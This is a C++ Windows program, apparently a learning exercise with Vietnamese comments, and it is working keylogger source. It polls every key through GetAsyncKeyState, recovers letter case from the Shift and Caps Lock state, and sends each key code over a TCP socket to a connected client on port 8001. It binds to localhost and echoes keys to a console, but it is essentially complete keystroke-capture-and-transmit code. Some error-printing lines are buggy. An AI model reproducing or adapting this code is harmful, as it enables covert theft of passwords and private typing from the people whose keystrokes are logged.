#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#define _WIN32_WINNT 0x0600
#define MAX_CONNECTIONS 1
#pragma warning(disable : 4996)
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <cstdlib>
#include <conio.h>
#include <iostream>
using namespace std;
#pragma comment(lib, "Ws2_32.lib")

//char batPhimNhan() {
//    char key_press;
//    int ascii_value;
//    cout << "Nhap phim bat ky de kiem tra ma ASCII\nAn ESC de thoat!\n\n\n";
//    while (1)
//    {
//        if (kbhit()) {
//            key_press = getch();
//            ascii_value = key_press;
//            if (ascii_value == 27) // For ESC
//                break;
//            cout << "Ban nhap phim-> \" " << key_press << " \" Gia tri ASCII =  " << ascii_value << "\n";
//        }
//    }
//}

bool IsCapitalized(short int shift, short int caps)
{
    bool s = shift < 0;
    bool c = (caps & 1) != 0;
    return s != c;
}

int main() {
    int iResult;
    WSADATA wsaData;
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }
    else
    {
        printf("Winsock DLL found!\n");
        printf("status: %s\n", wsaData.szSystemStatus);
    }

    SOCKET serverSocket = INVALID_SOCKET;
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET)
    {
        printf("Cannot create a socket!\n");
        WSACleanup();
        return 1;
    }
    else
    {
        printf("socket() is OK!\n");
    }

    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_port = htons(8001); // little endian -> big endian
    PCWSTR pszAddrString = L"127.0.0.1";
    int result = InetPtonW(AF_INET, pszAddrString, &service.sin_addr.s_addr);

    if (bind(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR)
    {
        printf("Error: %s\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
    }
    else {
        printf("bind() is OK!\n");
    }

    if (listen(serverSocket, MAX_CONNECTIONS) == SOCKET_ERROR)
    {
        printf("Error: %s\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
    }
    else {
        printf("listen() is OK!\n");
        printf("waiting for the connections...\n");
    }
    SOCKET* acceptedSockets = new SOCKET[MAX_CONNECTIONS];
    for (int i = 0; i < MAX_CONNECTIONS; i++)
    {
        acceptedSockets[i] = accept(serverSocket, NULL, NULL);
        if (acceptedSockets[i] == INVALID_SOCKET)
        {
            printf("socket %d connects failed!\nError: %s\n", i, WSAGetLastError());
            acceptedSockets[i] = NULL;
        }
        else
        {
            printf_s("socket %d connects successful\n", i);
            char c[4];
            int count = 0;
            while (acceptedSockets[i] != INVALID_SOCKET) {
                // printf("waiting for respone...\n\n");
                // char receivedBuf[1001];
                // int BytesCount = recv(acceptedSockets[i], receivedBuf, 1001, 0);
                // if (BytesCount == SOCKET_ERROR)
                /*{
                    printf("Something wrong!\nError: %s\n", WSAGetLastError());
                }
                else*/
                {
                    //printf("Message received: %s\n", receivedBuf);
      

                    /*printf("Input your message: ");
                    cin.getline(receivedBuf, 1000);
                    BytesCount = send(acceptedSockets[i], receivedBuf, 1001, 0);
                    if (BytesCount == SOCKET_ERROR)
                    {
                        printf("Something wrong!\nError: %s", WSAGetLastError());
                    }
                    else {
                        printf("Send success, send %ld bytes to server\n", BytesCount);
                    }*/
                    /*while (true) {
                        if (_kbhit()) {
                            s[0] = _getch();
                            s[1] = '\0';
                            cout << s << endl;
                            int BytesCount = send(acceptedSockets[i], s, 1001, 0);
                            if (BytesCount == SOCKET_ERROR)
                            {
                                printf("Something wrong!\nError: %s", WSAGetLastError());
                            }
                        }
                    }*/
                        for (int t = 0; t < 256; t++)
                        {
                            if(GetAsyncKeyState(VK_SHIFT) & 1)
                                cout << "SHIFT PRESS" << endl;
                            else if (GetAsyncKeyState(t) & 1)
                            {
                                int temp = t;
                                if(temp >= int('A') && temp <= int('Z') ){
                                short int shift = GetAsyncKeyState(VK_SHIFT);
                                short int caps = GetKeyState(VK_CAPITAL);
                                if(!IsCapitalized(shift, caps))
                                  temp += 32;
                                    cout << "Get the key event number: " << temp  << ", char: " << char(temp) << endl;
                                }else
                                    cout << "Get the key event number: " << temp  << ", char: " << char(MapVirtualKey(temp, MAPVK_VK_TO_CHAR)) << endl;
                                itoa(temp, c, 10);
                                int BytesCount = send(acceptedSockets[i], c, 4, 0);
                                if (BytesCount == SOCKET_ERROR)
                                {
                                    printf("Something wrong!\nError: %s", WSAGetLastError());
                                }
                            }
                        }
                        // cout << count++ << endl;
                        Sleep(150);
                }
            }
            /*if (kbhit()) {
                char press_key = getch();
                int BytesCount = send(serverSocket, &press_key, 1, 0);
                if (BytesCount == SOCKET_ERROR)
                {
                    printf("Something wrong!\nError: %s", WSAGetLastError());
                }
                else {
                    printf("Send success, send %ld bytes to server\n", BytesCount);
                }
            }*/
        }
    }
    fflush(stdin);
    closesocket(serverSocket);
    WSACleanup();
    return 0;
}